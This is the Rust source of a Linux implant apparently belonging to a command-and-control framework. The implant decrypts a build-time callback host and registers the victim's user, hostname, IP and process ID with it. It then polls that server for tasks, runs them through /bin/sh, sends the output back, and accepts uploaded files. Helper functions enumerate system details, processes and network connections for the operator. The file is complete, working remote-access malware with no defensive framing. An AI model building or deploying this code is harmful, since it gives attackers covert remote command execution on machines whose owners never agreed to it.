use link_common::{
    build_client, decrypt_config, derive_key, dispatch::dispatch_common, get_jitter_percent,
    get_sleep_seconds, should_exit, sleep, sleep_with_jitter, CallbackRequest, RegisterRequest,
    TaskResponse,
};
use std::env;
use std::process::Command;

const CALLBACK: &str = env!("CALLBACK");
const IMPLANT_SECRET: &str = env!("IMPLANT_SECRET");

// ── System info ──────────────────────────────────────────────────────────────

fn username() -> String {
    env::var("USER").unwrap_or_else(|_| "unknown".into())
}

fn hostname() -> String {
    std::fs::read_to_string("/etc/hostname")
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|_| "unknown".into())
}

fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .ok()
        .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
        .and_then(|s| s.local_addr().ok())
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".into())
}

fn platform_info() -> String {
    std::fs::read_to_string("/etc/os-release")
        .ok()
        .and_then(|s| {
            s.lines().find(|l| l.starts_with("PRETTY_NAME=")).map(|l| {
                l.trim_start_matches("PRETTY_NAME=")
                    .trim_matches('"')
                    .to_string()
            })
        })
        .unwrap_or_else(|| "linux".into())
}

// ── Main C2 loop ─────────────────────────────────────────────────────────────

pub fn link_loop() {
    let encryption_key = derive_key(IMPLANT_SECRET, "callback-salt");
    let decrypted_callback =
        decrypt_config(CALLBACK, &encryption_key).unwrap_or_else(|| CALLBACK.to_string());

    let client = build_client();
    let base = format!("https://{}", decrypted_callback);

    // Stage 1: establish session cookie
    loop {
        if client.get(format!("{}/js", base)).send().is_ok() {
            break;
        }
        if should_exit() {
            return;
        }
        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }

    // Stage 2: register
    let reg = RegisterRequest {
        link_username: username(),
        link_hostname: hostname(),
        internal_ip: local_ip(),
        external_ip: String::new(),
        platform: platform_info(),
        pid: std::process::id(),
    };

    let mut x_req_id = loop {
        if let Ok(r) = client
            .post(format!("{}/static/register", base))
            .header("X-Implant-Secret", IMPLANT_SECRET)
            .json(&reg)
            .send()
        {
            if let Ok(t) = r.json::<TaskResponse>() {
                break t.x_request_id;
            }
        }
        sleep(5);
    };

    // Stage 3: polling loop
    let mut prev_output = String::new();
    let mut prev_task_id = String::new();

    loop {
        if should_exit() {
            break;
        }

        let cb = CallbackRequest {
            q: &prev_output,
            tasking: &prev_task_id,
        };

        match client
            .post(format!("{}/static/get", base))
            .header("x-request-id", &x_req_id)
            .json(&cb)
            .send()
            .and_then(|r| r.json::<TaskResponse>())
        {
            Ok(task) => {
                x_req_id = task.x_request_id.clone();
                if task.q.is_empty() {
                    prev_output = String::new();
                    prev_task_id = String::new();
                } else if task.q == "exit" {
                    break;
                } else {
                    let effective_cmd = if task.q.starts_with("upload ") {
                        if let (Some(content), Some(path)) = (&task.upload, &task.upload_path) {
                            format!("upload {} {}", content, path)
                        } else {
                            task.q.clone()
                        }
                    } else {
                        task.q.clone()
                    };
                    prev_output = dispatch(&effective_cmd);
                    prev_task_id = task.tasking.clone();
                }
            }
            Err(_) => {
                prev_output = String::new();
                prev_task_id = String::new();
            }
        }

        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }
}

// ── Command dispatch ─────────────────────────────────────────────────────────

fn dispatch(raw: &str) -> String {
    if let Some(output) = dispatch_common(raw) {
        return output;
    }
    let (cmd, args) = link_common::split_first(raw);
    match cmd {
        "whoami" => format!("{}@{}", username(), hostname()),
        "info" => collect_system_info(),
        "ps" => list_processes(),
        "netstat" => list_network_connections(),
        "shell" => shell_exec(args),
        _ => shell_exec(raw),
    }
}

fn shell_exec(cmd: &str) -> String {
    match Command::new("/bin/sh").arg("-c").arg(cmd).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                out.push_str(&err);
            }
            out
        }
        Err(e) => format!("[-] {}", e),
    }
}

// ── System information ────────────────────────────────────────────────────────

fn collect_system_info() -> String {
    use std::fs;

    let mut info = Vec::new();

    if let Ok(os_release) = fs::read_to_string("/etc/os-release") {
        if let Some(name) = os_release.lines().find(|l| l.starts_with("PRETTY_NAME=")) {
            if let Some(value) = name.split('=').nth(1) {
                info.push(format!("OS Version: {}", value.trim_matches('"')));
            }
        }
    }

    info.push(format!("Architecture: {}", std::env::consts::ARCH));
    info.push(format!("User: {}@{}", username(), hostname()));

    let mut interfaces = Vec::new();
    if let Ok(entries) = fs::read_dir("/sys/class/net") {
        for entry in entries.flatten() {
            let iface_name = entry.file_name().to_string_lossy().into_owned();
            if iface_name != "lo" {
                if let Some(addr) = get_interface_ip(&iface_name) {
                    interfaces.push(format!("{}: {}", iface_name, addr));
                }
            }
        }
    }
    if !interfaces.is_empty() {
        info.push(format!("Network: {}", interfaces.join(", ")));
    }

    if let Ok(mem_info) = fs::read_to_string("/proc/meminfo") {
        if let Some(mem_total) = mem_info.lines().find(|l| l.starts_with("MemTotal:")) {
            if let Some(value) = mem_total.split_whitespace().nth(1) {
                info.push(format!("RAM: {} KB", value));
            }
        }
    }

    if let Ok(cpu_info) = fs::read_to_string("/proc/cpuinfo") {
        let cpu_count = cpu_info
            .lines()
            .filter(|l| l.starts_with("processor"))
            .count();
        if cpu_count > 0 {
            info.push(format!("CPU Cores: {}", cpu_count));
        }
        if let Some(model_line) = cpu_info.lines().find(|l| l.starts_with("model name")) {
            if let Some(model) = model_line.split(':').nth(1) {
                info.push(format!("CPU Model: {}", model.trim()));
            }
        }
    }

    if let Ok(uptime) = fs::read_to_string("/proc/uptime") {
        if let Some(seconds) = uptime.split_whitespace().next() {
            if let Ok(uptime_secs) = seconds.parse::<f64>() {
                let hours = (uptime_secs / 3600.0).floor();
                let minutes = ((uptime_secs % 3600.0) / 60.0).floor();
                info.push(format!("Uptime: {:.0}h {:.0}m", hours, minutes));
            }
        }
    }

    info.push(format!("Process ID: {}", std::process::id()));

    if let Ok(cwd) = std::env::current_dir() {
        info.push(format!("Working Directory: {}", cwd.display()));
    }

    info.push(format!(
        "Environment Variables: {}",
        std::env::vars().count()
    ));

    info.join("\n")
}

fn get_interface_ip(interface: &str) -> Option<String> {
    use std::fs;

    let operstate = fs::read_to_string(format!("/sys/class/net/{}/operstate", interface)).ok()?;
    if operstate.trim() != "up" {
        return None;
    }

    let fib = fs::read_to_string("/proc/net/fib_trie").ok()?;
    let mut prev_ip: Option<std::net::Ipv4Addr> = None;
    for line in fib.lines() {
        let trimmed = line.trim();
        if trimmed.contains("LOCAL") && trimmed.starts_with("32") {
            if let Some(ip) = prev_ip {
                if !ip.is_loopback() && !ip.is_unspecified() {
                    return Some(ip.to_string());
                }
            }
        } else if let Ok(val) = trimmed
            .split_whitespace()
            .next()
            .unwrap_or("")
            .parse::<u32>()
        {
            prev_ip = Some(std::net::Ipv4Addr::from(val));
        } else {
            prev_ip = None;
        }
    }
    None
}

fn list_processes() -> String {
    use std::fs;
    use std::path::Path;

    let mut processes = Vec::new();
    processes.push("PID\tPPID\tUSER\t\tCOMMAND".to_string());
    processes.push("-".repeat(50));

    if let Ok(entries) = fs::read_dir("/proc") {
        for entry in entries.flatten() {
            if let Ok(pid_str) = entry.file_name().into_string() {
                if let Ok(_pid) = pid_str.parse::<u32>() {
                    let proc_path = Path::new("/proc").join(&pid_str);
                    let status_path = proc_path.join("status");
                    if let Ok(status) = fs::read_to_string(status_path) {
                        let mut process_pid = 0u32;
                        let mut process_ppid = 0u32;
                        let mut process_uid = 0u32;
                        let mut process_name = "unknown".to_string();

                        for line in status.lines() {
                            if line.starts_with("Name:") {
                                if let Some(name) = line.split(':').nth(1) {
                                    process_name = name.trim().to_string();
                                }
                            } else if line.starts_with("Pid:") {
                                if let Ok(p) = line.split(':').nth(1).unwrap_or("").trim().parse() {
                                    process_pid = p;
                                }
                            } else if line.starts_with("PPid:") {
                                if let Ok(pp) = line.split(':').nth(1).unwrap_or("").trim().parse()
                                {
                                    process_ppid = pp;
                                }
                            } else if line.starts_with("Uid:") {
                                if let Some(u) = line
                                    .split(':')
                                    .nth(1)
                                    .and_then(|s| s.split_whitespace().next())
                                    .and_then(|s| s.parse().ok())
                                {
                                    process_uid = u;
                                }
                            }
                        }

                        let uname = get_username_from_uid(process_uid);
                        processes.push(format!(
                            "{}\t{}\t{}\t{}",
                            process_pid, process_ppid, uname, process_name
                        ));
                    }
                }
            }
        }
    }

    if processes.len() <= 2 {
        "No processes found or insufficient permissions".to_string()
    } else {
        processes.join("\n")
    }
}

fn get_username_from_uid(uid: u32) -> String {
    if let Ok(passwd) = std::fs::read_to_string("/etc/passwd") {
        for line in passwd.lines() {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() >= 3 {
                if let Ok(line_uid) = parts[2].parse::<u32>() {
                    if line_uid == uid {
                        return parts[0].to_string();
                    }
                }
            }
        }
    }
    uid.to_string()
}

fn list_network_connections() -> String {
    let mut connections = Vec::new();
    connections.push("Proto\tLocal Address\t\tRemote Address\t\tState\tPID/Program".to_string());
    connections.push("-".repeat(80));

    for (proto, path) in [
        ("TCP", "/proc/net/tcp"),
        ("TCP6", "/proc/net/tcp6"),
        ("UDP", "/proc/net/udp"),
        ("UDP6", "/proc/net/udp6"),
    ] {
        if let Ok(content) = std::fs::read_to_string(path) {
            parse_net_connections(&content, proto, &mut connections);
        }
    }

    if connections.len() <= 2 {
        "No network connections found or insufficient permissions".to_string()
    } else {
        connections.join("\n")
    }
}

fn parse_net_connections(content: &str, proto: &str, connections: &mut Vec<String>) {
    for line in content.lines().skip(1) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 10 {
            continue;
        }
        let (local_ip_hex, local_port_hex) = match parts[1].split_once(':') {
            Some(pair) => pair,
            None => continue,
        };
        let (remote_ip_hex, remote_port_hex) = match parts[2].split_once(':') {
            Some(pair) => pair,
            None => continue,
        };
        let state = parts[3];
        let inode = parts[9];

        let local_ip = hex_to_ip(local_ip_hex);
        let local_port = hex_to_port(local_port_hex);
        let remote_ip = hex_to_ip(remote_ip_hex);
        let remote_port = hex_to_port(remote_port_hex);
        let process_info = get_process_from_inode(inode);

        connections.push(format!(
            "{}\t{}:{}\t\t{}:{}\t\t{}\t{}",
            proto, local_ip, local_port, remote_ip, remote_port, state, process_info
        ));
    }
}

fn hex_to_ip(hex_str: &str) -> String {
    if hex_str.len() < 8 {
        return hex_str.to_string();
    }
    // /proc/net/tcp stores IPs in little-endian order — read bytes in reverse
    (0..4)
        .rev()
        .map(|i| {
            u8::from_str_radix(&hex_str[i * 2..i * 2 + 2], 16)
                .map(|b| b.to_string())
                .unwrap_or_else(|_| "?".to_string())
        })
        .collect::<Vec<_>>()
        .join(".")
}

fn hex_to_port(hex_str: &str) -> String {
    u16::from_str_radix(hex_str, 16)
        .map(|p| p.to_string())
        .unwrap_or_else(|_| hex_str.to_string())
}

fn get_process_from_inode(inode: &str) -> String {
    if let Ok(proc_entries) = std::fs::read_dir("/proc") {
        for proc_entry in proc_entries.flatten() {
            if let Ok(pid_str) = proc_entry.file_name().into_string() {
                if pid_str.parse::<u32>().is_ok() {
                    let fd_path = format!("/proc/{}/fd", pid_str);
                    if let Ok(fd_entries) = std::fs::read_dir(&fd_path) {
                        for fd_entry in fd_entries.flatten() {
                            if let Ok(link_target) = std::fs::read_link(fd_entry.path()) {
                                if link_target
                                    .to_str()
                                    .is_some_and(|s| s.contains(&format!("socket:[{}]", inode)))
                                {
                                    let status_path = format!("/proc/{}/status", pid_str);
                                    if let Ok(status) = std::fs::read_to_string(&status_path) {
                                        for line in status.lines() {
                                            if line.starts_with("Name:") {
                                                if let Some(name) = line.split(':').nth(1) {
                                                    return format!("{}[{}]", pid_str, name.trim());
                                                }
                                            }
                                        }
                                    }
                                    return format!("{}[unknown]", pid_str);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    "-".to_string()
}
